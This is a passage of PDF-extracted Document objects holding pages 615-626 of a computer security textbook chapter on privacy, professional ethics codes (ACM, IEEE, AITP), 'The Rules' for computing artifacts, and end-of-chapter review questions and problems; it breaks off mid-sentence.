data to extend our knowledge \\nand develop new tools for enhancing health and well-being. Law enforcement and \\nFigure 19.4 Common Criteria Privacy Class Decomposition\\nPrivacy\\nAnonymity\\nPseudonymity\\nUnlinkability\\nUnobservability Unobservability without soliciting information\\nAuthorized user observability\\nUnlinkability\\nUnobservability\\nAllocation of information impacting unobservability\\nPseudonymity\\nAnonymity Anonymity without soliciting information\\nReversible pseudonymity\\nAlias pseudonymity\\nM19_STAL0611_04_GE_C19.indd   615 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 617, 'page_label': '616'}, page_content='616  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\nintelligence agencies have become increasingly aggressive in using data surveillance \\ntechniques to fulfill their mission, as vividly shown by the Snowden revelations \\nfrom 2013 on [L YON15]. And private organizations are exploiting a number of \\ntrends to increase their ability to build detailed profiles of individuals, including the \\nwide-spread use of Websites and social media, the increase in electronic payment \\nmethods, near-universal use of cellular phone communications, ubiquitous compu -\\ntation, sensor webs, and so on. While such data are usually collected for a specific \\npurpose, such as managing client interactions, organizations increasingly wish to \\nreuse and analyze these data for other purposes. These purposes include better \\ntargeting of customer marketing, research, and to help inform decision-making. \\nThe result is a tension between, on the one hand, enabling beneficial outcomes in \\nareas including scientific research, public health, national security, law enforcement \\nand efficient use of resources, that could result from big data analytics, while on the \\nother hand respecting an individual’s right to privacy, fairness, equality and freedom \\nof speech [HORO15].\\nAnother area of particular concern is the rapid rise in the use of public social \\nmedia sites, such as Facebook, that gather, analyze, and share large amounts of \\ndata on individuals and their interactions with other individuals and organizations. \\nMany people willingly upload large amount of personal information, which previ -\\nously may\\xa0have been regarded as private and sensitive, in return for the benefit of \\nrapidly sharing it with their friends. This information could then be aggregated and \\nanalyzed by these companies. While some work has been done on suitable regulation \\nof such companies and the way they manage and use such data, as [SMIT12] notes, \\nvery little has been done on the effect of other people’s data on individuals. This \\nincludes the upload of photos or status updates by others that include an individual, \\nwhich may also include relevant metadata such as time and location. Such data could \\npotentially be used by current and future employers, insurance companies, private \\n investigators, and others, in their interactions with the individual, possibly to that \\nindividual’s detriment.\\nBoth policy and technical approaches are needed to protect privacy when \\nboth government and non-government organizations seek to learn as much as \\npossible about individuals. In terms of technical approaches, the requirements for \\nprivacy protection for data stored on information systems can be addressed in part \\nusing the technical mechanisms developed for database security, as we discussed \\nin Chapter 5.\\nWith regard to social media sites, technical controls include the provision of \\nsuitable privacy settings to manage who can view data on individuals, and notification \\nwhen one individual is referenced or tagged in another’s content. That is, by providing \\nsuitable access controls to this data, but on a scale far larger than that used in most \\nIT systems. Although social media sites include some form of these controls, they \\nare constantly changing. This causes frustration for users, who struggle to keep up to \\ndate with these mechanisms, and also indicates that the most appropriate controls \\nhave yet to be found.\\nAnother technical approach for managing privacy concerns in big data analysis \\nis to anonymize the data, removing any personally identifying information, before \\nrelease to researchers or other organizations for analysis. Unfortunately, a number of \\nrecent examples have shown that such data can sometimes be reidentified, indicating \\nM19_STAL0611_04_GE_C19.indd   616 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 618, 'page_label': '617'}, page_content='19.3 / PRIVACY  617\\nthat great care is needed with this approach. Done correctly, though, it does enable \\nthe benefits from big data analysis whilst avoiding issues of individual privacy con -\\ncerns. [HORO15] notes a recent US Federal Trade Commission framework that com-\\nbines technical and policy mechanisms which encourages this approach by protecting \\nagainst re identification of anonymized data.\\nIn terms of policy, guidelines are needed to manage the use and reuse of big data, \\nensuring suitable constraints are imposed in order to preserve privacy. [CLAR15] \\ndetails a set of guidelines for the use of digital data in human research, but which \\ncould easily be applied in other areas. The guidelines address the following areas:\\n• Consent: Ensuring participants can make informed decisions about their \\n participation in the research.\\n• Privacy and confidentiality : Privacy is the control that individuals have over \\nwho can access their personal information. Confidentiality is the principle that \\nonly authorized persons should have access to information.\\n• Ownership and authorship: Addresses who has responsibility for the data, and at \\nwhat point does an individual give up their right to control their personal data.\\n• Data sharing—assessing the social benefits of research: The social benefits that \\nresult from data matching and reuse of data from one source or research project \\nin another.\\n• Governance and custodianship: Oversight and implementation of the manage-\\nment, organization, access, and preservation of digital data.\\nIn another policy approach, [POLO13] argues that a suitable cost-benefit analy-\\nsis by decision makers of big data systems should balance the clear privacy costs \\nagainst the benefits of the use of big data. It suggests focusing on who are the ben-\\neficiaries of big data analysis, what is the nature of the perceived benefits, and with \\nwhat level of certainty can those benefits be realized. In doing so, it offers ways to take \\naccount of benefits that accrue not only to businesses but also to individuals and to \\nsociety at large that result from this use.\\nWe also see changes in laws in various countries in response to some of these \\nconcerns. With regard to the use of mass versus targeted surveillance, [L YON15] dis-\\ncusses changes in laws in several countries, including the United States and the United \\nKingdom, that aim to limit bulk collection of metadata. These laws attempt to better \\nregulate the mass surveillance efforts of the NSA and its sister agencies, and address \\nthe concern that metadata is regarded as personal data by many individuals, despite \\narguments to the contrary by these agencies. The paper continues by exploring the \\nresearch challenges in the field of surveillance studies that could assist in further \\ndeveloping the understanding of and response to these issues. [RYAN16] discusses \\nhow recent decisions of the courts in the United Kingdom, the European Union, \\nand Canada address the tension between security benefits resulting from big data \\nanalysis of metadata gathered from mobile phone and Internet usage, and personal \\nprivacy. These responses include declaring some legislation invalid, and in other cases \\nimposing safeguards designed to further protect privacy rights. It notes that key issues \\naddressed in these cases include the areas of justification of necessary but propor -\\ntional intrusion upon privacy rights, accountability for such intrusions to independent \\nauthorities, and transparency to the public on the types of intrusions permitted.\\nM19_STAL0611_04_GE_C19.indd   617 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 619, 'page_label': '618'}, page_content='618  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\n 19.4 ETHICAL ISSUES\\nBecause of the ubiquity and importance of information systems in organization of \\nall types, there are many potential misuses and abuses of information and electronic \\ncommunication that create privacy and security problems. In addition to questions of \\nlegality, misuse and abuse raise concerns of ethics. Ethics refers to a system of moral \\nprinciples that relates to the benefits and harms of particular actions, and to the right-\\nness and wrongness of motives and ends of those actions. In this section, we look at \\nethical issues as they relate to computer and information system security.\\nEthics and the Information Technology Professions\\nTo a certain extent, a characterization of what constitutes ethical behavior for those \\nwho work with or have access to information systems is not unique to this context. \\nThe basic ethical principles developed by civilizations apply. However, there are some \\nunique considerations surrounding computers and information systems. First, com-\\nputer technology makes possible a scale of activities that were not possible before. \\nThis includes a larger scale of recordkeeping, particularly on individuals, with the abil-\\nity to develop finer-grained personal information collection and more precise data \\nmining and data matching. The expanded scale of communications and the expanded \\nscale of interconnection brought about by the Internet magnify the power of an indi-\\nvidual to do harm. Second, computer technology has involved the creation of new \\ntypes of entities for which no agreed ethical rules have previously been formed, such \\nas databases, Web browsers, chat rooms, cookies, and so on.\\nFurther, it has always been the case that those with special knowledge or special \\nskills have additional ethical obligations beyond those common to all humanity. We \\ncan illustrate this in terms of an ethical hierarchy (see Figure 19.5), based on one \\ndiscussed in [GOTT99]. At the top of the hierarchy are the ethical values profes -\\nsionals share with all human beings, such as integrity, fairness, and justice. Being a \\nprofessional with special training imposes additional ethical obligations with respect \\nto those affected by his or her work. General principles applicable to all professionals \\narise at this level. Finally, each profession has associated with it specific ethical values \\nand obligations related to the specific knowledge of those in the profession and the \\npowers that they have to affect others. Most professions embody all of these levels \\nin a professional code of conduct, a subject discussed subsequently.\\nEthical Issues Related to Computers and Information \\nSystems\\nLet us turn now more specifically to the ethical issues that arise from computer \\ntechnology. Computers have become the primary repository of both personal infor-\\nmation and negotiable assets, such as bank records, securities records, and other \\nfinancial information. Other types of databases, both statistical and otherwise, are \\nassets with considerable value. These assets can only be viewed, created, and altered \\nby technical and automated means. Those who can understand and exploit the tech-\\nnology, plus those who have obtained access permission, have power related to \\nthose assets.\\nM19_STAL0611_04_GE_C19.indd   618 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 620, 'page_label': '619'}, page_content='19.4 / ETHICAL IssUEs  619\\nA classic paper on computers and ethics [PARK88] points out that ethical issues \\narise as the result of the roles of computers, such as the following:\\n• Repositories and processors of information : Unauthorized use of otherwise \\nunused computer services or of information stored in computers raises ques -\\ntions of appropriateness or fairness.\\n• Producers of new forms and types of assets: For example, computer programs \\nare entirely new types of assets, possibly not subject to the same concepts of \\nownership as other assets.\\n• Instruments of acts: To what degree must computer services and users of com-\\nputers, data, and programs be responsible for the integrity and appropriateness \\nof computer output?\\n• Symbols of intimidation and deception : The images of computers as thinking \\nmachines, absolute truth producers, infallible, subject to blame, and as anthro-\\npomorphic replacements of humans who err should be carefully considered.\\nWe are concerned with balancing professional responsibilities with ethical or \\nmoral responsibilities. We cite two areas here of the types of ethical questions that face \\na computing or IT professional. The first is that IT professionals may find themselves in \\nsituations where their ethical duty as professionals comes into conflict with loyalty to \\nFigure 19.5 The Ethical Hierarchy\\nEach profession\\nProfessionalism\\nHumanity\\nHigher order of care,societal well-being\\nIntegrity,\\nfairness,care,...\\nProfession-uniquestandards and\\nprofessionalism, standards\\nin profession’s code of ethics\\nM19_STAL0611_04_GE_C19.indd   619 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 621, 'page_label': '620'}, page_content='620  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\ntheir employer. Such a conflict may give rise for an employee to consider “blowing the \\nwhistle,” or exposing a situation that can harm the public or a company’s customers. \\nFor example, a software developer may know that a product is scheduled to ship with \\ninadequate testing to meet the employer’s deadlines. The decision of whether to blow \\nthe whistle is one of the most difficult that an IT professional can face. Organizations \\nhave a duty to provide alternative, less extreme opportunities for the employee, such \\nas an in-house ombudsperson coupled with a commitment not to penalize employees \\nfor exposing problems in-house. Additionally, professional societies should provide a \\nmechanism whereby society members can get advice on how to proceed.\\nAnother example of an ethical question concerns a potential conflict of interest. \\nFor example, if a consultant has a financial interest in a certain vendor, this should be \\nrevealed to any client if that vendor’s products or services might be recommended \\nby the consultant.\\nCodes of Conduct\\nUnlike scientific and engineering fields, ethics cannot be reduced to precise laws \\nor sets of facts. Although an employer or a client of a professional can expect that \\nthe professional has an internal moral compass, many areas of conduct may pres -\\nent ethical ambiguities. To provide guidance to professionals and to articulate what \\nemployers and customers have a right to expect, a number of professional societies \\nhave adopted ethical codes of conduct.\\nA professional code of conduct can serve the following functions [GOTT99]:\\n1. A code can serve two inspirational functions: as a positive stimulus for ethical \\nconduct on the part of the professional, and to instill confidence in the customer or \\nuser of an IT product or service. However, a code that stops at just providing inspi-\\nrational language is likely to be vague and open to an abundance of interpretations.\\n2. A code can be educational. It informs professionals about what should be their \\ncommitment to undertake a certain level of quality of work and their respon -\\nsibility for the well-being of users of their product and the public, to the extent \\nthe product may affect nonusers. The code also serves to educate managers on \\ntheir responsibility to encourage and support employee ethical behavior and \\non their own ethical responsibilities.\\n3. A code provides a measure of support for a professional whose decision to act \\nethically in a situation may create conflict with an employer or customer.\\n4. A code can be a means of deterrence and discipline. A professional society can use \\na code as a justification for revoking membership or even a professional license. \\nAn employee can use a code as a basis for a disciplinary action.\\n5. A code can enhance the profession’s public image, if it is seen to be widely honored.\\nWe illustrate the concept of a professional code of ethics for computer profession-\\nals with three specific examples. The ACM (Association for Computing  Machinery) \\nCode of Ethics and Pr ofessional Conduct (see Figure 19.6) applies to computer \\n scientists.5 The IEEE (Institute of Electrical and Electronic Engineers) Code of Ethics  \\n(see Figure 19.7) applies to computer engineers as well as other types of electrical and \\nelectronic engineers. The AITP (Association of Information Technology  Professionals, \\n5Figure 19.6 is an abridged version of the ACM Code.\\nM19_STAL0611_04_GE_C19.indd   620 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 622, 'page_label': '621'}, page_content='19.4 / ETHICAL IssUEs  621\\nFigure 19.6 ACM Code of Ethics and Professional Conduct\\n(Copyright © 1997, Association for Computing Machinery, Inc.)\\n1. GENERAL MORAL IMPERATIVES.\\n1.1 Contribute to society and human well-being.\\n1.2 Avoid harm to others.\\n1.3 Be honest and trustworthy.\\n1.4 Be fair and take action not to discriminate.\\n1.5 Honor property rights including copyrights and patent.\\n1.6 Give proper credit for intellectual property.\\n1.7 Respect the privacy of others.\\n1.8 Honor confidentiality.\\n2. MORE SPECIFIC PROFESSIONAL RESPONSIBILITIES.\\n2.1 Strive to achieve the highest quality, effectiveness and dignity in both the process and products of \\n professional work.\\n2.2 Acquire and maintain professional competence.\\n2.3 Know and respect existing laws pertaining to professional work.\\n2.4 Accept and provide appropriate professional review.\\n2.5 Give comprehensive and thorough evaluations of computer systems and their impacts, including analysis  \\nof possible risks.\\n2.6 Honor contracts, agreements, and assigned responsibilities.\\n2.7 Improve public understanding of computing and its consequences.\\n2.8 Access computing and communication resources only when authorized to do so.\\n3. ORGANIZATIONAL LEADERSHIP IMPERATIVES.\\n3.1 Articulate social responsibilities of members of an organizational unit and encourage full acceptance of \\nthose responsibilities.\\n3.2 Manage personnel and resources to design and build information systems that enhance the quality of \\nworking life.\\n3.3 Acknowledge and support proper and authorized uses of an organization’s computing and communication \\nresources.\\n3.4 Ensure that users and those who will be affected by a system have their needs clearly articulated during the \\nassessment and design of requirements; later the system must be validated to meet requirements.\\n3.5 Articulate and support policies that protect the dignity of users and others affected by a computing system.\\n3.6 Create opportunities for members of the organization to learn the principles and limitations of computer \\nsystems.\\n4. COMPLIANCE WITH THE CODE.\\n4.1 Uphold and promote the principles of this Code.\\n4.2 Treat violations of this code as inconsistent with membership in the ACM.\\nformerly the Data Processing Management Association) Standard of Conduct (see \\n Figure\\xa019.8) applies to managers of computer systems and projects.\\nA number of common themes emerge from these codes, including (1) dignity and \\nworth of other people; (2) personal integrity and honesty; (3) responsibility for work; \\n(4) confidentiality of information; (5) public safety, health, and welfare; (6)\\xa0participa-\\ntion in professional societies to improve standards of the profession; and (7) the notion \\nthat public knowledge and access to technology is equivalent to social power.\\nAll three codes place their emphasis on the responsibility of professionals to \\nother people, which, after all, is the central meaning of ethics. This emphasis on people \\nrather than machines or software is to the good. However, the codes make little spe-\\ncific mention of the subject technology, namely computers and information  systems. \\nThat is, the approach is quite generic and could apply to most professions and does \\nM19_STAL0611_04_GE_C19.indd   621 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 623, 'page_label': '622'}, page_content='622  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\nFigure 19.7 IEEE Code of Ethics\\n(Copyright © 2006, Institute of Electrical and Electronics Engineers)\\nWe, the members of the IEEE, in recognition of the importance of our technologies in affecting \\nthe\\xa0quality of\\xa0life throughout the world, and in accepting a personal obligation to our profession, \\nits members and the communities we serve, do hereby commit ourselves to the highest ethical and \\nprofessional conduct and agree:\\n1. to accept responsibility in making decisions consistent with the safety, health and welfare of \\nthe\\xa0public, and to disclose promptly factors that might endanger the public or the environment;\\n2. to avoid real or perceived conflicts of interest whenever possible, and to disclose them to \\naffected parties when they do exist;\\n3. to be honest and realistic in stating claims or estimates based on available data;\\n4. to reject bribery in all its forms;\\n5. to improve the understanding of technology, its appropriate application, and potential \\nconsequences;\\n6. to maintain and improve our technical competence and to undertake technological tasks \\nfor others only if\\xa0qualified by training or experience, or after full disclosure of pertinent \\nlimitations;\\n7. to seek, accept, and offer honest criticism of technical work, to acknowledge and correct \\nerrors,\\xa0and to credit properly the contributions of others;\\n8. to treat fairly all persons regardless of such factors as race, religion, gender, disability, age, or \\nnational origin;\\n9. to avoid injuring others, their property, reputation, or employment by false or malicious  \\naction;\\n10. to assist colleagues and co-workers in their professional development and to support them in \\nfollowing this code of ethics.\\nFigure 19.8 AITP Standard of Conduct\\n(Copyright © 2006, Association of Information Technology Professionals)\\nIn recognition of my obligation to management I shall:\\n• Keep my personal knowledge up-to-date and insure that proper expertise is available when needed.\\n• Share my knowledge with others and present factual and objective information to management \\nto\\xa0the best of my ability.\\n• Accept full responsibility for work that I perform.\\n• Not misuse the authority entrusted to me.\\n• Not misrepresent or withhold information concerning the capabilities of equipment, software, \\nor\\xa0systems.\\n• Not take advantage of the lack of knowledge or inexperience on the part of others.\\nIn recognition of my obligation to my fellow members and the profession I shall:\\n• Be honest in all my professional relationships.\\n• Take appropriate action in regard to any illegal or unethical practices that come to my attention. \\nHowever, I\\xa0will bring charges against any person only when I have reasonable basis for believing \\nin\\xa0the truth of the allegations and without any regard to personal interest.\\n• Endeavor to share my special knowledge.\\n• Cooperate with others in achieving understanding and in identifying problems.\\n• Not use or take credit for the work of others without specific acknowledgment and authorization.\\n• Not take advantage of the lack of knowledge or inexperience on the part of others for personal gain.\\nM19_STAL0611_04_GE_C19.indd   622 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 624, 'page_label': '623'}, page_content='19.4 / ETHICAL IssUEs  623\\nnot fully reflect the unique ethical problems related to the development and use of \\ncomputer and IT technology. For example, these codes do not specifically deal with \\nthe issues raised by [PARK88] listed in the preceding subsection.\\nThe Rules\\nA different approach from the ones discussed so far is a collaborative effort to develop \\na short list of guidelines on the ethics of developing computer systems. The guidelines, \\nwhich continue to evolve, are the product of the Ad Hoc Committee on Responsible \\nComputing. Anyone can join this committee and suggest changes to the guidelines. The \\ncommittee has published a document, regularly updated, entitled Moral Responsibility \\nfor Computing Artifacts, and is generally referred to as The Rules.6 The current version \\nof The Rules is version 27 , reflecting the thought and effort that has gone into this project.\\nThe term computing artifact  refers to any artifact that includes an executing \\ncomputer program. This includes software applications running on a general purpose \\ncomputer, programs burned into hardware and embedded in mechanical devices, \\nrobots, phones, Web bots, toys, programs distributed across more than one machine, \\nand many other configurations. The Rules apply to, among other types: software that \\nis commercial, free, open source, recreational, an academic exercise or a research tool.\\nAs of this writing, the Rules are as follows:\\n1. The people who design,  develop, or deploy a computing artifact are morally \\nresponsible for that artifact, and for the foreseeable effects of that artifact. This \\nresponsibility is shared with other people who design, develop, deploy, or know-\\ningly use the artifact as part of a sociotechnical system.\\n2. The shared responsibility of computing artifacts is not a zero-sum game. The \\nresponsibility of an individual is not reduced simply because more people become \\ninvolved in designing, developing, deploying, or using the artifact. Instead, a per-\\nson’s responsibility includes being answerable for the behaviors of the artifact and \\nfor the artifact’s effects after deployment, to the degree to which these effects are \\nreasonably foreseeable by that person.\\n3. People who knowingly use a particular computing artifact are morally responsible \\nfor that use.\\n4. People who knowingly design, develop, deploy, or use a computing artifact can do \\nso responsibly only when they make a reasonable effort to take into account the \\nsociotechnical systems in which the artifact is embedded.\\n5. People who design, develop, deploy, promote, or evaluate a computing  artifact \\nshould not explicitly or implicitly deceive users about the artifact or its foresee-\\nable effects, or about the sociotechnical systems in which the artifact is embedded.\\nCompared to the codes of ethics discussed earlier, The Rules are few in  number \\nand quite general in nature. They are intended to apply to a broad spectrum of  people \\ninvolved in computer system design and development. The Rules have gathered broad \\nsupport as useful guidelines by academics, practitioners, computer scientists, and philos-\\nophers from a number of countries [MILL11]. It seems likely that The Rules will influ-\\nence future versions of codes of ethics by computer-related professional organizations.\\n6The latest version of these rules may be found at https://edocs.uis.edu/kmill2/www/TheRules/\\nM19_STAL0611_04_GE_C19.indd   623 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 625, 'page_label': '624'}, page_content='624  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\n 19.5 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\ncode of conduct\\ncomputer crime\\nconsumer\\ncopyright\\ncybercrime\\nDigital Millennium \\nCopyright Act (DMCA)\\ndigital rights \\nmanagement\\nethics\\ninfringement\\nintellectual property\\npatent\\nprivacy\\nrights holder\\nservice provider\\ntrademark\\nReview Questions\\n 19.1 Describe the classifications of computer crime as defined in the International Conven-\\ntion on Cybercrime.\\n 19.2 List the main types of intellectual property for which legal protection is available and \\ndiscuss the corresponding legal protection.\\n 19.3 Define three types of intellectual property.\\n 19.4 What are the basic conditions that must be fulfilled to claim a copyright?\\n 19.5 Define the three types of patents.\\n 19.6 List the actions exempted from the provisions of the Digital Millennium Copyright \\nAct and other copyright laws.\\n 19.7 State the difference between anonymity and pseudonymity.\\n 19.8 Describe the principal categories of users of digital rights management systems.\\n 19.9 What are the OECD Guidelines on the protection of privacy and transborder flows of \\ninformation?\\n 19.10 How do the concerns relating to priv acy in the Common Criteria differ from the \\n concerns usually expressed in official documents, standards, and organizational policies?\\n 19.11 What are the five guideline areas suggested for managing privacy issues in regard to \\nthe use of digital data in human research?\\n 19.12 What functions can a professional code of conduct serve to fulfill?\\n 19.13 How do “The Rules” differ from a professional code of ethics?\\nProblems\\n 19.1 For each of the cybercrimes cited in Table 19.1, indicate whether it falls into the \\n category of computer as target, computer as storage device, or computer as communi-\\ncations tool. In the first case, indicate whether the crime is primarily an attack on data \\nintegrity, system integrity, data confidentiality, privacy, or availability.\\n 19.2 Explain the ‘WannaCry’ cyberattack considering it from an ethics-of-cybersecurity \\nviewpoint.\\n 19.3 Review the r esults of a recent Computer Crime Survey such as the CSI/FBI or \\n AusCERT surveys. What changes do they note in the types of crime reported? What \\ndifferences are there between their results and those shown in Table 19.2?\\n 19.4 An early controversial use of the DCMA was its use in a case in the United States \\nbrought by the Motion Picture Association of America (MPAA) in 2000 to attempt to \\nsuppress distribution of the DeCSS program and derivatives. These could be used to \\nM19_STAL0611_04_GE_C19.indd   624 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 626, 'page_label': '625'}, page_content='19.5 / KEY TERMs, REVIEW QUEsTIONs, AND PROBLEMs  625\\ncircumvent the copy protection on commercial DVDs. Search for a brief description \\nof this case and it’s outcome. Determine whether the MPAA was successful in sup -\\npressing details of the DeCSS descrambling algorithm.\\n 19.5 Consider a popular DRM system like Apple’s FairPlay, used to protect audio tracks \\npurchased from the iTunes music store. If a person purchases a track from the iTunes \\nstore by an artist managed by a record company such as EMI, identify which company \\nor person fulfils each of the DRM component roles shown in Figure 19.2.\\n 19.6 Explain the requirement to safeguard privacy by considering the psychological effects \\non victims of cybercrime through social media.\\n 19.7 Consider a scenario where a software is created and patented and some other indi -\\nvidual creates a similar software and distributes it publicly. Is it a breach of intellectual \\nproperty rights?\\nCollection limitation\\nThere should be limits to the collection of personal data and any such data should be obtained by lawful and \\nfair means and, where appropriate, with the knowledge or consent of the data subject.\\nData quality\\nPersonal data should be relevant to the purposes for which they are to be used, and, to the extent necessary \\nfor\\xa0those purposes, should be accurate, complete, and kept up-to-date.\\nPurpose specification\\nThe purposes for which personal data are collected should be specified not later than at the time of data \\n collection and the subsequent use limited to the fulfillment of those purposes or such others as are not \\n incompatible with those purposes and as are specified on each occasion of change of purpose.\\nUse limitation\\nPersonal data should not be disclosed, made available, or otherwise used for purposes other than those specified \\nin accordance with the preceding principle, except with the consent of the data subject or by the authority of law.\\nSecurity safeguards\\nPersonal data should be protected by reasonable security safeguards against such risks as loss or unauthorized \\naccess, destruction, use, modification, or disclosure of data.\\nOpenness\\nThere should be a general policy of openness about developments, practices and policies with respect to \\n personal data. Means should be readily available of establishing the existence and nature of personal data, and \\nthe main purposes of their use, as well as the identity and usual residence of the data controller.\\nIndividual participation\\nAn individual should have the right:\\na. to obtain from a data controller, or otherwise, confirmation of whether or not the data controller has \\ndata relating to him;\\nb. to have communicated to him, data relating to him within a reasonable time; at a charge, if any, that is \\nnot excessive; in a reasonable manner; and in a form that is readily intelligible to him;\\nc. to be given reasons if a request made under subparagraphs(a) and (b) is denied, and to be able to \\n challenge such denial; and\\nd. to challenge data relating to him and, if the challenge is successful to have the data erased, rectified, \\ncompleted, or amended.\\nAccountability\\nA data controller should be accountable for complying with measures which give effect to the principles  \\nstated above.\\nTable 19.3 OECD Guidelines on the Protection of Privacy and Transborder Flows of Information\\nM19_STAL0611_04_GE_C19.indd   625 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 627, 'page_label': '626'}, page_content='626  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\n 19.8 A management briefing lists the following as the top five actions that to improve \\n privacy. Compare these recommendations to the Information Privacy Standard of \\nGood Practice in Section 4 of the document SecurityPolicy.pdf, available at https://\\napp.box.com/v/CompSec4e. Comment on the differences.\\n1. Show visible and consistent management support.\\n2. Establish privacy responsibilities. Privacy requirements need to be incorporated \\ninto any position that handles personally identifiable information (PII).\\n3. Incorporate privacy and security into the systems and application life cycle. This \\nincludes a formal privacy impact assessment.\\n4. Provide continuous and effective awareness and training.\\n5. Encrypt moveable PII. This includes transmission as well as mobile devices.\\n 19.9 Assume you are a mid-level systems administrator for one section of a larger organi-\\nzation. You try to encourage your users to have good password policies and regularly \\nrun password-cracking tools to check that those in use are not guessable. You have \\nbecome aware of a burst of hacker password-cracking activity recently. In a burst of \\nenthusiasm, you transfer the password files from a number of other sections of the \\norganization and attempt to crack them. To your horror, you find that in one section \\nfor which you used to work (but now have rather strained relationships with), some -\\nthing like 40% of the passwords are guessable (including that of the vice-president \\nof the section, whose password is “president!”). You quietly sound out a few former \\ncolleagues and drop hints in the hope things might improve. A couple of weeks later \\nyou again transfer the password file over to analyze in the hope things have improved. \\nThey haven’t. Unfortunately, this time one of your colleagues notices what you are \\ndoing. Being a rather “by the book” person, he notifies senior management, and that \\nevening you find yourself being arrested on a charge of hacking and thrown out of a \\njob. Did you do anything wrong? Briefly 